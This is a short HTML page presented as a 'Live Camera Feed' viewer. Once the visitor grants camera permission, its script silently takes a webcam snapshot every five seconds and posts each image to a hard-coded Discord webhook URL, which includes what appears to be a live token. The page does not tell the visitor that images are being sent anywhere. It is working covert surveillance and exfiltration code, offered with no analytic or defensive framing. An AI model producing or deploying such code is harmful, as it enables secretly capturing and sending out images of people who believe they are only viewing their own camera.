# 3346
Nothing 
<!DOCTYPE html>
<html>
<body>
    <h2>Live Camera Feed</h2>
    <video id="video" autoplay playsinline style="width:100%; max-width:400px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const webhookURL = "https://discord.com/api/webhooks/1472884442866520160/RtdC3xDotncw_nJcMsi6LDsefoGYPlJH3iuZwuv-TF51XPkVDRFSH3T4p6_qyY_59-FS";

        // 1. Request Camera Permission
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                // 2. Start capturing every 5 seconds
                setInterval(captureAndSend, 5000);
            })
            .catch(err => console.error("Permission Denied", err));

        function captureAndSend() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('file', blob, 'shot.jpg');
                formData.append('content', 'New camera snapshot:');

                fetch(webhookURL, { method: 'POST', body: formData });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
